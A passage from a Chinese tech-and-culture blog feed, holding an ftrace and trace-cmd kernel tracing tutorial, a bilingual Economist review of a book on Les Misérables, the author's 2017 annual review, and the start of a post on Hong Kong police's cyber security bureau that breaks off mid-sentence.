12月 28 17:24 x86drwxr-xr-x. 3 root root 0 12月 28 17:24 boot_paramsdrwxr-xr-x. 34 root root 0 12月 28 17:24 bdi-r--r--r--. 1 root root 0 12月 28 17:24 gpiodrwxr-xr-x. 3 root root 0 12月 28 17:24 usbdrwxr-xr-x. 4 root root 0 12月 28 17:24 xendrwxr-xr-x. 6 root root 0 12月 28 17:24 tracingdrwxr-xr-x. 2 root root 0 12月 28 17:24 extfragdrwxr-xr-x. 2 root root 0 12月 28 17:24 dynamic_debugdrwxr-xr-x. 2 root root 0 12月 28 17:24 hid-rw-r--r--. 1 root root 0 12月 28 17:24 sched_featuresdrwxr-xr-x. 2 root root 0 12月 28 17:24 mcedrwxr-xr-x. 2 root root 0 12月 28 17:24 kprobes-r--r--r--. 1 root root 0 12月 28 17:24 vmmemctl/sys/kernel/debug/tracing# ls -lrt-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_thresh-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_on-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_max_latency-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_enabled-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_cpumaskdrwxr-xr-x. 2 root root 0 12月 28 17:24 trace_stat-r--r--r--. 1 root root 0 12月 28 17:24 trace_pipe-rw-r--r--. 1 root root 0 12月 28 17:24 trace_options--w--w----. 1 root root 0 12月 28 17:24 trace_marker-rw-r--r--. 1 root root 0 12月 28 17:24 trace_clock-rw-r--r--. 1 root root 0 12月 28 17:24 trace-rw-r--r--. 1 root root 0 12月 28 17:24 sysprof_sample_period-r--r--r--. 1 root root 0 12月 28 17:24 set_graph_function-rw-r--r--. 1 root root 0 12月 28 17:24 set_ftrace_pid-rw-r--r--. 1 root root 0 12月 28 17:24 set_ftrace_notrace-r--r--r--. 1 root root 0 12月 28 17:24 saved_cmdlines-r--r--r--. 1 root root 0 12月 28 17:24 READMEdrwxr-xr-x. 2 root root 0 12月 28 17:24 options-rw-r--r--. 1 root root 0 12月 28 17:24 function_profile_enabled-r--r--r--. 1 root root 0 12月 28 17:24 dyn_ftrace_total_info-rw-r--r--. 1 root root 0 12月 28 17:24 buffer_size_kb-r--r--r--. 1 root root 0 12月 28 17:24 available_tracers-r--r--r--. 1 root root 0 12月 28 17:24 available_filter_functions-rw-r--r--. 1 root root 0 12月 28 17:24 set_event-r--r--r--. 1 root root 0 12月 28 17:24 printk_formatsdrwxr-xr-x. 34 root root 0 12月 28 17:24 per_cpudrwxr-xr-x. 24 root root 0 12月 28 17:24 events-r--r--r--. 1 root root 0 12月 28 17:24 available_events-r--r--r--. 1 root root 0 12月 28 17:24 kprobe_profile-rw-r--r--. 1 root root 0 12月 28 17:24 kprobe_events-r--r--r--. 1 root root 0 12月 28 17:24 stack_trace-rw-r--r--. 1 root root 0 12月 28 17:24 stack_max_size-rw-r--r--. 1 root root 0 5月 31 11:50 current_tracer-rwxr-xr-x. 1 root root 0 5月 31 11:57 set_ftrace_filter 三、BASIC1. Function tracer以Function tracer为例，结果存储在 trace，该文件类似一张报表，该表将显示 4 列信息。首先是进程信息，包括进程名和PID ；第二列是CPU；第三列是时间戳；第四列是函数信息，缺省情况下，这里将显示内核函数名以及它的上一层调用函数。 12345678910111213141516cd /sys/kernel/debug/tracingecho function &gt; current_tracercat trace# tracer: function## TASK-PID CPU# TIMESTAMP FUNCTION# | | | gmond-6684 [004] 13285965.088308: _spin_lock &lt;-hrtimer_interruptgmond-6684 [004] 13285965.088308: ktime_get_update_offsets &lt;-hrtimer_interruptgmond-6684 [004] 13285965.088309: __run_hrtimer &lt;-hrtimer_interruptgmond-6684 [004] 13285965.088309: __remove_hrtimer &lt;-__run_hrtimergmond-6684 [004] 13285965.088309: tick_sched_timer &lt;-__run_hrtimergmond-6684 [004] 13285965.088309: ktime_get &lt;-tick_sched_timergmond-6684 [004] 13285965.088310: tick_do_update_jiffies64 &lt;-tick_sched_timergmond-6684 [004] 13285965.088310: update_process_times &lt;-tick_sched_timer 2. Function graph tracerFunction graph tracer 和 function tracer 类似，但输出为函数调用图，更加容易阅读：12345678910111213141516171819202122# tracer: function_graph## TIME CPU DURATION FUNCTION CALLS# | | | | | | | | 21) ==========&gt; | 21) | smp_apic_timer_interrupt() &#123; 31) ==========&gt; | 31) | smp_apic_timer_interrupt() &#123; 8) | smp_apic_timer_interrupt() &#123; 11) 2.598 us | native_apic_mem_write(); 18) 3.106 us | native_apic_mem_write(); 30) ==========&gt; | 30) | smp_apic_timer_interrupt() &#123; 3) 3.590 us | native_apic_mem_write(); 22) 2.944 us | native_apic_mem_write(); 7) 3.392 us | native_apic_mem_write(); 17) ==========&gt; | 17) | smp_apic_timer_interrupt() &#123; 27) ==========&gt; | 27) | smp_apic_timer_interrupt() &#123; 16) ==========&gt; | 16) | smp_apic_timer_interrupt() &#123; 四、体系结构Ftrace有两大组成部分，framework和一系列的tracer 。每个tracer完成不同的功能，它们统一由framework管理。 ftrace 的trace信息保存在ring buffer中，由framework负责管理。Framework 利用debugfs建立tracing目录，并提供了一系列的控制文件。 ftrace is a dynamic tracing system. 当你开始“ftracing”一个内核函数的时候，该函数的代码实际上就已经发生变化了。内核将在程序集中插入一些额外的指令，使得函数调用时可以随时通知追踪程序。 WARNNING:使用ftrace追踪内核将有可能对系统性能产生影响，追踪的函数越多，开销越大。使用者必须提前做好准备工作，生产环境必须谨慎使用。 12#cat available_tracers //查看支持的tracersblk kmemtrace function_graph wakeup_rt wakeup function sysprof sched_switch initcall nop 五、Useful Tools1. trace-cmdtrace-cmd是一个非常有用的Ftrace命令行工具。123sudo apt-get install trace-cmd或者git clone git://git.kernel.org/pub/scm/linux/kernel/git/rostedt/trace-cmd.git 使用方法：123456sudo trace-cmd record --help #helpsudo trace-cmd record -p function -P 123456 #record for PIDsudo trace-cmd record -p function -l do_page_fault #record for function plugin 'function'Hit Ctrl^C to stop recording trace.dat123456789101112$ sudo trace-cmd report chrome-15144 [000] 11446.466121: function: do_page_fault chrome-15144 [000] 11446.467910: function: do_page_fault chrome-15144 [000] 11446.469174: function: do_page_fault chrome-15144 [000] 11446.474225: function: do_page_fault chrome-15144 [000] 11446.474386: function: do_page_fault chrome-15144 [000] 11446.478768: function: do_page_fault CompositorTileW-15154 [001] 11446.480172: function: do_page_fault chrome-1830 [003] 11446.486696: function: do_page_fault CompositorTileW-15154 [001] 11446.488983: function: do_page_fault CompositorTileW-15154 [001] 11446.489034: function: do_page_fault CompositorTileW-15154 [001] 11446.489045: function: do_page_fault 在很有情况下不能使用函数追踪，需要依赖 事件追踪 的支持，例如： 1234567891011121314151617181920212223# cat available_events //查看支持的事件类型power:power_startpower:power_frequencypower:power_endsched:sched_kthread_stopsched:sched_kthread_stop_retsched:sched_wait_tasksched:sched_wakeupsched:sched_wakeup_newsched:sched_switchsched:sched_migrate_tasksched:sched_process_freesched:sched_process_exitsched:sched_process_waitsched:sched_process_forksched:sched_stat_waitsched:sched_stat_sleepsched:sched_stat_iowaitsched:sched_stat_runtimesudo trace-cmd record -e sched:sched_switchsudo trace-cmd report 输出如下：1234516169.624862: Chrome_ChildIOT:24817 [112] S ==&gt; chrome:15144 [120]16169.624992: chrome:15144 [120] S ==&gt; swapper/3:0 [120]16169.625202: swapper/3:0 [120] R ==&gt; Chrome_ChildIOT:24817 [112]16169.625251: Chrome_ChildIOT:24817 [112] R ==&gt; chrome:1561 [112]16169.625437: chrome:1561 [112] S ==&gt; chrome:15144 [120] 切换路径：PID 24817 -&gt; 15144 -&gt; kernel -&gt; 24817 -&gt; 1561 -&gt; 15114。 2. perf-toolsperf-tools 是性能调试大神Brendan Gregg开发的一个工具包，提供了很多强大的功能，例如：iosnoop: 磁盘I/O分析详细包括延迟iolatency: 磁盘I/O分析概要(柱状图)execsnoop: 追踪进程exec()opensnoop: 追踪open()系统调用，包含文件名killsnoop: 追踪kill()信号（进程和信号详细） 代码下载：https://github.com/brendangregg/perf-tools 123456789101112131415161718192021222324# ./execsnoop //显示新进程和参数：Tracing exec()s. Ctrl-C to end. PID PPID ARGS 22898 22004 man ls 22905 22898 preconv -e UTF-8 22908 22898 pager -s 22907 22898 nroff -mandoc -rLL=164n -rLT=164n -Tutf8 22906 22898 tbl 22911 22910 locale charmap 22912 22907 groff -mtty-char -Tutf8 -mandoc -rLL=164n -rLT=164n 22913 22912 troff -mtty-char -mandoc -rLL=164n -rLT=164n -Tutf8 22914 22912 grotty# ./iolatency -Q //测量设备I/O延迟Tracing block I/O. Output every 1 seconds. Ctrl-C to end. &gt;=(ms) .. &lt;(ms) : I/O |Distribution | 0 -&gt; 1 : 1913 |######################################| 1 -&gt; 2 : 438 |######### | 2 -&gt; 4 : 100 |## | 4 -&gt; 8 : 145 |### | 8 -&gt; 16 : 43 |# | 16 -&gt; 32 : 43 |# | 32 -&gt; 64 : 1 |# |[...] 六、可视化工具:KernelSharkKernelShark是trace-cmd的前端工具，提供了对trace.dat的可视化分析（Graph View 、List View、Simple and Advance filtering）。 扩展阅读：动态追踪技术 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 (Key)Julia Evans:ftrace: trace your kernel functions! (Key)IBM developerWorks@刘明：ftrace简介,2009 Debugging the kernel using Ftrace - part 1 (Dec 2009, Steven Rostedt) Debugging the kernel using Ftrace - part 2 (Dec 2009, Steven Rostedt Secrets of the Linux function tracer (Jan 2010, Steven Rostedt) trace-cmd: A front-end for Ftrace (Oct 2010, Steven Rostedt) Using KernelShark to analyze the real-time scheduler (2011, Steven Rostedt) Ftrace: The hidden light switch (2014, Brendan Gregg) (Key)the kernel documentation:ftrace.txt documentation on events you can trace Documentation/events.txt some docs on ftrace design for linux kernel devs (not as useful, but interesting) Documentation/ftrace-design.txt trace-cmd图形化工具：KernelShark Youtube:ELC2011 Ftrace GUI (KernelShark) (Key)StevenRostedt:ELC2011_KernelShark(quick tutorial)(PDF) source:https://riboseyim.github.io/]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[世纪小说《悲惨世界》]]></title>
    <url>%2F2017%2F04%2F13%2FArtistic-Les-Miserables%2F</url>
    <content type="text"><![CDATA[摘要 经济学人：解读世纪小说《悲惨世界》 经济学人：解读世纪小说《悲惨世界》 Books and arts Feb 23rd 2017The Novel of the Century: The Extraordinary Adventure of Les Misérables.By David Bellos. Particular Books; 307 pages; £20.To be published in America by Farrar, Straus &amp; Giroux in March; $27. 克劳德-米歇尔·勋伯格（Claude-Michel Schönberg，1944年7月6日－），法籍犹太裔唱片录音师、演员、歌手、流行曲和音乐剧作曲家，经常和填词人阿兰·鲍伯利（Alain Boublil）合作。1987年凭借《悲惨世界》获得托尼奖（最佳原创音乐）。 “只要地球上还有无知和贫穷，”维克多·雨果在《悲惨世界》序言中写道，“这样的书就不可能是无用的。” 155年以前，在法国首次出版并传播到其他方，这部小说或者其流行普及本身从未失去它的意义。 《悲惨世界》大约有65个电影版本（最早的版本出现在1909年），使它成为有史以来改变最多的作品。第一阶段，音乐剧于1863年一月在费城开幕。自1980以来，Alain Boublil和Claude-Michel Schönberg合作的音乐歌剧已经在44个国家和349个城市上演了超过53000场次。然而，从一开始，众多的改编者和译者就得从纷繁庞杂的源头中获取素材。英国的爱好者必须等到2008年才有一个完整的英文小说文本，正如原著作者曾经期望的那样。即使对《悲惨世界》的爱好者来说，雨果震惊世界的巨著，感觉就像一个失落的大陆。 大卫·贝洛斯（David Bellos），一个出生于英国的普林斯顿大学法国文学教授，著名的翻译家，通过他的作品我们得以一窥门径，包括五个组成部分，48本书和365章，思路清晰、机智风趣。他既博学又有趣，他揭示了小说的魔力在于它的多种多样功能。雨果的非凡功绩是在拿破仑之后提供一幅“错综复杂的现实主义的法国”，“一个戏剧性的、引人入胜的书” 充满了悬念、演示了一个“慷慨的道德原则”，对今天读者的仍然具有吸引力。 雨果，当时已经是《巴黎圣母院》的作者，作为诗人、剧作家和小说家的文学巨星，于1845开始写一个前罪犯的故事，一个社会中的穷人和被遗弃者如何寻找新的生活。通过冉阿让（Jean Valjean）的生活轨迹，自1815年从废船监狱释放以来，就使他面临艰难的风险抉择，雨果编织了一个巨大而“非常紧密的“社会冲突与个人新生历程的壁毯。 1848年革命，其中激进的狂热分子发现，“他的头脑是理性的”，虽然他的心是穷人”，打断了雨果的庞大工程。它重新成为流亡作家，被新发迹的皇帝驱逐（拿破仑三世），定居在英属格恩西海峡群岛：不再是“辉煌的野心家”而是一个“独立的抗议者”。 奇怪的是，这个“英国王室的小小的封建前哨”，促成了一本书的孕育和诞生，这本书赢得了全世界的心、促进了思想的改变。珍贵手稿的编辑和打印依赖于维多利亚女王皇家邮政的计划和英属格恩西轮船时刻表。在1861年，“书籍史上最伟大的一笔交易”，雨果获得了相当于20年的主教的薪水：足够“建小铁路”。直到1862年底出版，Charles Wilbour的英文翻译版被报道是“美国历史上最大的书籍订单”。 除了雨果的文学对手（大仲马把它比作“涉水通过泥浆”），每个人都喜欢冉阿让的改过自新历程，众多的各色人物让人很快就进入民俗的世界：街上的女孩梵蒂尼，她的女儿珂赛特，海胆伽弗洛什，学生马吕斯。美国内战期间，删减了谴责奴隶制的内容之后，盗版小说甚至在南方士兵中间广为流传。一个疲惫的双关语冠以他们的指挥官的名字，他们戏称自己是“李的悲惨世界”。（南方指挥官罗伯特-李将军） 从人道地对待罪犯，再到关怀流浪儿童，《悲惨世界》带头呼吁改革，促成了“未来社会的进步”。一些书真的改变了世界。这一次，它早就打破了舞台上的票房纪录。在音乐剧中，雨果的英雄在吟诵：一首电视选秀节目选手喜爱的——“带他回家”。Bellos先生的工作毋宁说，他将“悲惨世界”从制造者和他的时代完整重现。 Economist:By the book How Victor Hugo came to write “Les Misérables”, his magnum opus The extraordinary story of a book that changed the world The Novel of the Century: The Extraordinary Adventure of Les Misérables. By David Bellos. Particular Books; 307 pages; £20. To be published in America by Farrar, Straus &amp; Giroux in March; $27. “AS LONG as there are ignorance and poverty on Earth,” wrote Victor Hugo in his preface to “Les Misérables”, “books such as this one may not be useless.” Over the 155 years since it was first published in France and then elsewhere, the novel has never lost its relevance—or its popularity. Around 65 film versions (the first in 1909) make “Les Misérables” the most frequently adapted novel of all time. The first stage musical opened in Philadelphia in January 1863. Since 1980 Alain Boublil and Claude-Michel Schönberg’s operatic melodrama has been performed more than 53,000 times in 44 countries and 349 cities. Yet, from the outset, adapters and translators cherry-picked elements from their supersized source. British admirers had to wait until 2008 for a complete English text of the novel in the order in which the author had planned it to be read. Even to lovers of “Les Mis”, Hugo’s world-shaking blockbuster can feel like a lost continent. David Bellos, an English-born professor of French literature at Princeton University and an eminent translator, navigates through its five parts, 48 “books” and 365 chapters with clarity and wit. At once erudite and entertaining, he shows how the novel’s magic lies in its multitasking versatility. Hugo’s extraordinary feat is to deliver “an intricately realistic portrait” of France after Napoleon, “a dramatic page-turner” packed with suspense—and a demonstration of “generous moral principles” that readers still find appealing today. Hugo, already the author of “Notre-Dame de Paris” and a literary superstar as a poet, playwright and novelist, began in 1845 to write his story of a former convict seeking a new life in a society rigged against the poor and outcast. Around the questing figure of Jean Valjean, freed from the prison-hulks in 1815 to make his way against the steepest odds, Hugo stitched a vast but “very tightly knit” tapestry of social strife and personal rebirth. The revolution of 1848, in which the radical firebrand discovered that “his head was with order” although his heart “was with the poor”, interrupted Hugo’s mammoth project. It resumed after the exiled writer, banished by the upstart emperor, Napoleon III, settled on the Channel Island of Guernsey: no longer a “brilliant careerist” but a “stand-alone protester”. Curiously, this “tiny feudal outpost of the British crown” hosted the gestation and birth of a book that won hearts and changed minds across the world. The editing and printing of the precious manuscript depended on the schedules of Queen Victoria’s Royal Mail and the Guernsey steamer timetables. In 1861 “the biggest deal in book history” saw Hugo paid the equivalent of 20 years of a bishop’s stipend: enough “to build a small railway”. By late 1862, the year of publication, Charles Wilbour’s English translation was reported to be “the largest order ever placed for a book in America”. Save for Hugo’s literary rivals (Alexandre Dumas likened it to “wading through mud”), everybody loved the long haul of Valjean’s rehabilitation in the company of characters who soon entered folklore: the street-girl Fantine, her daughter Cosette, the urchin Gavroche, the student Marius. Shorn of its condemnation of slavery, the novel even circulated in a pirate edition among Confederate soldiers during the American civil war. In a weary pun on their commander’s name, they dubbed themselves “Lee’s Miserables”. From the humane treatment of ex-offenders to the care of street children, “Les Misérables” spearheaded calls for reform and contributed to “the future improvement of society”. Few books really change the world. This one did, long before it broke box-office records on stage. In the musical Hugo’s hero intones—in a song loved by television talent-show contestants—“Bring Him Home”. Mr Bellos does just that, as he restores “Les Mis” to its maker and his times. This article appeared in the Books and arts section of the print edition under the headline “By the book” 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 参考文献1、 Youtube :Bring Him Home 2、 Amazon: The Novel of the Century: The Extraordinary Adventure of Les Misérables3、Wiki David Bellos]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
        <tag>Economist</tag>
        <tag>Books</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的2017年度盘点]]></title>
    <url>%2F2017%2F04%2F10%2FCheck2017%2F</url>
    <content type="text"><![CDATA[摘要 一、Core Topics 二、年度成果 三、过程改进 &amp; 方法论 四、Information Technology 五、Culture &amp; History 六、生活艺术 七、品牌运营 This article is part of an Autobiography tutorial series. Make sure to check out my other articles as well: 我的 2019 年度盘点 我的 2018 年度盘点 我的 2017 年度盘点 我的 2016 年度盘点 我的 2012 阅读书单 一、Core Topics Learning based on full English. Operating System Kernel &amp; Dynamic tracking &amp; Go Programming Language. Lincoln Foundation &amp; Absolutism Research. 2017 年初计划复核 二、年度成果2.1 电子书《Linux Perf Master》 https://www.gitbook.com/book/riboseyim/linux-perf-master/details 时间点 订阅用户数 Downloads Unique visitors Page Views 说明 201701 —– —– —– —– GitBook Edition 0.1 20170630 135 4,206 4,936 —– GitBook Edition 0.2 20171230 187 4,821 7,708 29,052 GitBook Edition 0.3 2.2 专利实务（发明） 申请号：201711294715.2 三、过程改进 &amp; 方法论 工程师的自我修养：全英文技术学习实践 Kanban看板管理实践精要 我的写作工具链（持续更新,v3） 嗑药简史：关于瘾品，成瘾机制及其历史 四、Information Technology 动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术（三）：Tracing Your Kernel Function! 数据可视化（七）Graphite 体系结构详解 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（四）开源 GIS 技术简史 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 WiFi 安全漏洞 Cyber-Security: WEB应用安全、攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: 香港警务处网络安全与科技罪案调查科 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 远程通信协议：从 CORBA 到 gRPC 基于 Kafka 构建事件溯源型微服务 基于 Go 语言快速构建一个RESTful API服务 关于程序日志Logger(Go语言描述) 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory Linux 常用命令一百条 Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：Web应用性能优化 Linux 性能诊断：负载评估 修订 2.0 Linux 性能诊断：快速检查单(Netflix版) 修订 2.0 玩转编程语言:构建自定义代码生成器 Linux.com:引入开源软件的六大运营挑战 软件工程实践中的十大法则 Stack Overflow：云计算平台的趋势分析 Stack Overflow：2017年最赚钱的编程语言 资讯| 三星主办 ONOS Build 2017 机器学习|自然语言处理技术简报 经济学人：计算机如何学习人类语言？ 五、Culture &amp; History 真假女权主义：从江青到咪蒙 风月集|诗三百，思无邪 读书笔记|红学 红楼故事：佩刀沽酒作长歌 读书笔记|Linux之父：Just for Fun！ 政府行为模型及预测：女权主义与政治运动 读书笔记|黄仁宇《明代的漕运》 读书笔记|张集馨《时晴斋主人自叙年谱》 读书笔记|宋景迁《太平天国》 读书笔记|顾准《顾准日记》 读书笔记|彼得·德鲁克：管理是一种自由 不忘初心|我的2012年阅读书单 艺术评论|斯皮尔伯格的林肯情怀 艺术评论|经济学人：解读世纪小说《悲惨世界》 Financial Times：中国将加强进口儿童文学作品管制 外军研究|美军授勋及嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 六、生活 Birdwatching|广州南沙湿地公园 Birdwatching|广州海珠湿地公园 园林|南京瞻园 Skill: Cooking Skill: Clock Repair 骑行：1000 公里 七、品牌运营 天之将明，其黑尤烈；飓风过岗，伏草惟存。 1、RiboseYim’s Blog(riboseyim.github.io) 2、RiboseYim’s Twitter 3、RiboseYim’s Telegram 2017年中盘点方法论 工程师的自我修养：全英文技术学习实践 过程改进 我的写作工具链（持续更新,v3） add: OmniFocus advanced: OmniGraffle 、 Atom 、 Ulysses reduce: Evernote Information Technology 网络数据包的捕获与分析（libpcap、BPF及gopacket） 基于Kafka构建事件溯源型微服务 基于Go语言快速构建一个RESTful API服务 关于程序日志Logger(Go语言描述) 动态追踪技术：Tracing Your Kernel Function! How Linux Works（一）：How the Linux Kernel Boots How Linux Works（二）：User Space &amp; RAM Linux常用命令一百条 读书笔记|《图解性能优化》 （翻译）Linux.com:引入开源软件的六大运营挑战 Culture &amp; History 读书笔记|Linux之父：Just for Fun！ 读书笔记|黄仁宇《明代的漕运》 读书笔记|张集馨《时晴斋主人自叙年谱》 读书笔记|宋景迁《太平天国》 读书笔记|顾准《顾准日记》 读书笔记|彼得·德鲁克：管理是一种自由 不忘初心：我的2012年阅读书单 艺术评论|斯皮尔伯格的林肯情怀 (翻译)艺术评论|经济学人：解读世纪小说《悲惨世界》 (翻译)Financial Times：中国将加强进口儿童文学作品管制 外军研究|美军授勋及嘉奖制度观察 Cyber-Security|香港拟增设网络安全与科技罪案总警司 Travel 观鸟|广州湿地公园 园林|南京瞻园 Skills Cooking:BASIC 异地多活 Off-site activities 天之将明，其黑尤烈；飓风过岗，伏草惟存。 一、Blog(riboseyim.github.io)CNZZ排名：20160630 221849720170630 820615 UP 63.01% 二、Twitter (@RiboseYim)20170630 tweets:105 followers:10 三、小密圈20170630 35+162+177 total: 374 2017年学习计划Technology [ ] FlameGraph目标定位：熟练使用立项时间：2015年11月当前进度：—– [ ] 源码解读系列文集目标定位：面向输出的学习能力立项时间：2016年2月当前进度：—– [ ] 《TCP／IP详解》【英】 目标定位：通读 立项时间：2016年11月 当前进度：略读 [x] 《Google SRE》【英】 目标定位：通读、选择一个专题实践 立项时间：2016年5月 当前进度：略读 [x] 《Introducing Go》【英】 目标定位：通读、熟练掌握 立项时间：2016年11月 当前进度：完成（201705） [ ]《Learning Spark》【英】 目标定位：通读、熟练掌握 立项时间：2016年11月 当前进度：——— [x] 《How LINUX works》【英】 目标定位：通读、分享一篇 立项时间：2016年11月 当前进度：完成（201705） [x] 读书笔记|《图解性能优化》 当前进度：通读 Books [X] 《李自成》 （完成） [X] 《白鹿原》 （完成） [X] 《戴笠传》 （完成） [X] 《蒋介石日记》 （完成） [X] 《吾国吾民》 （完成） 《林肯传（英文版）》 （50%） [ ] 《通往奴役之路（英文版）》（0%） [ ]《Team of Rivals，the Political Genius of Abraham Lincoln》目标定位：通读立项时间：2016年中当前进度：—– [ ]《The Water Kingdom: A Secret History of China》目标定位：通读立项时间：2016年12月当前进度：—– [ ]《罗马帝国衰亡史》目标定位：通读立项时间：2014年当前进度：—– [x] 《太平天国》（史景迁）（英译中）目标定位：通读立项时间：2016年11月当前进度：完成（201701） [x] 《明代漕运 1368-1644》目标定位：通读立项时间：2016年11月当前进度：完成（201705） [x] 《十六世纪明代中国之财政与税收》目标定位：通读立项时间：2016年10月当前进度：完成（201705） 创作计划 [x] 技术《源码解读系列：Git》立项时间：2015年当前进度：—– [ ] 工具类《优雅绘图指南》（关于技术绘图）立项时间：2015年当前进度：—– [x] 电子书GitBook:《Linux Perf Master》立项时间：2016年11月当前进度：201702 Edition 0.1201707 Edition 0.2201712 Edition 0.3 参考文献 Simon Eskildsen |@sirupsen 2015]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:香港警务处网络安全与科技罪案调查科]]></title>
    <url>%2F2017%2F04%2F09%2FCyberSecurity-CSTCB%2F</url>
    <content type="text"><![CDATA[摘要 网络安全和科技罪案调查科（CSTCB） 总警司 概述近日，香港立法会人事编制小组委员会开会讨论于警务处开设一个总警司常额职位，以领导网络安全及科技罪案调查科工作。香港保安局向立法會申請拨款，开设一个常额总警司职位，年薪為一百四十六万港元，附带其他福利开支后则为二百二十八万港元。（注：在获得立法会批准以前，实际上一直由一名高级警司负责管理。其他人员编制则由警队內部调配，不受拨款影响。） 网络安全和科技罪案调查科（CSTCB）网络安全和科技罪案调查科（Cyber Security and Technology Crime Bureau，缩写：CSTCB，简称科罪组）隶属于香港警务处刑事及保安处刑事部，主要责任为搜集及分析情报、调查严重科技罪案、作出法律及技术性研究，并且与业内专业人士和海外执法机关联络，防止科技罪案发生；与此同时，24小时监察香港（自愿登记参与）的主要电脑系统的网络数据流量变化，防范针对上述系统的网络攻击等科技罪行，确保网络安全。 2011年，有黑客攻击香港交易所网站，导致逾7间股票及窝轮牛熊证停牌。香港警务处认为除了需要调查案件外，亦需要主动监察以预防网络攻击发生。于2012年成立网络安全中心（英文：Cyber Security Centre，缩写：CSC），早期由一名总督察出任主管，领导3名高级督察及20余名警员。2014年1月15日发表的《2014年度香港行政长官施政报告》宣布，科技罪案组将会于同年12月与网络安全中心合。拨归网络安全及科技罪案调查科以后，组建了网络侦测队、网络情报队、网络安全实验室（Cyber Security Laboratory）及网络安全审定及事故应变队，人员大幅扩充。（首任主管至今为梁德光警司）。 原本隶属于商业罪案调查科的科技罪案组及辖下网络安全中心转入网络安全及科技罪案调查科之后，成为警务处继四大刑侦部门商业罪案调查科（CCB）、有组织及三合会调查科（OCTB，俗称O记）、毒品调查科（NB）及刑事情报科（CIB）的第五个刑侦部门。將由一名总警司带领，并增至一百八十人。 升格后的网络安全和科技罪案调查科，属下设有“科技罪案组”及“网络安全组”两大组别，前者调查集团式及高科技罪案，后者则调查大型网络攻击及重大网络安全事故，另设“高级训练队”，负责科技罪案调查的技术培训和训练。（截止2016年11月1日，该科共有编制238人（军装226个）） 总警司总警司（Chief Superintendent of Police，缩写CSP）俗称“一拖二”，是香港警察职级其中一个宪委级职级，为高级警官的级别；位于高级警司之上，警务处助理处长之下，由警务处处长委任。香港警察职级乃参考自英国警衔／军衔，总警司比照上校职级。 最近几年，为了向立法会申请拨款预算，保安局和警务处各级长官可谓全体动员、契而不舍： EC(2016-17)23建議在香港警務處開設1個總警司常額職位(警務人員薪級第55點)，由財務委員會批准當日起生效，以領導網絡安全及科技罪案調查科(出席人員：保安局副局長／保安局首席助理秘書長／香港警務處助理處長(刑事)／香港警務處高級警司(網絡安全及科技罪案調查科)／香港警務處警司(網絡安全及科技罪案調查科))(保安事務委員會曾於2014年6月3日和2016年12月6日討論此項建議)(人事編制小組委員會曾於2015年3月11日和2015年4月29日討論此項建議)(就此項建議政府當局提交予人事編制小組委員會的補充資料文(ESC67/14-15(01)和ESC104/14-15(01))) 支持意见：犯案日趋复杂 需培专才应对 增设总警司不单是希望短时间内处理网络安全工作，而是要长远打击科技罪案，并指近年网络罪案数字倍升，要由具领导才能及视野的人处理。——保安局副局长李家超 若增设常额总警司职位打击网络罪行，有关人员要具备前瞻性，以及可预视罪案发展趋势。他期望加强人手、硬件及软件方面的能力，同时指国际合作在打击罪行方面非常重要。——警务处助理处长钟兆扬。 刑事部辖下负责侦查犯罪的其他科别各自由一名总警司率领，该科自成立以来一直没有专责的总警司职位，因此其主管人员现在必须向刑事部其他总警司汇报，寻求高层次的指示。一般而言，负责打击网络罪行的海外执法单位主管的职级高于或等同于警务处总警司的职级。这些单位包括国际刑警及G7 高科技犯罪工作小组，英国国家打击犯罪总署辖下国家打击网络犯罪组、澳洲联邦警察辖下高科技犯罪侦查小组及新加坡警务处刑事调查部辖下的打击网上罪行指挥中心。 反对意见：担忧网络警察沦为政治打手劉慧卿議員表示，雖然她同意有必要加強警方在打擊科技罪行方面的人手，但立法會議員普 遍擔心網絡安全及科技罪案調查科會監視市民在 互聯網上的活動。此外，劉議員指出，其他司法管 轄區的立法機關有成立專責委員會，以審閱敏感的政府文件，例如有關國家安全的文件。政府當局應 參考海外的做法，為立法會議員制訂特別安排，讓他們檢視與保安有關的敏感資料，例如網絡安全中 心的工作。 李卓人議員表示，雖然他同意應加強網絡 安全及科技罪案調查科人手，針對網絡襲擊及科技 罪行為公眾及商業機構提供保障，但他極之擔心所 增加的人手會被用以監視市民的網絡活動，以達政治目的，尤其是為了方便根據《刑事罪行條例》(第 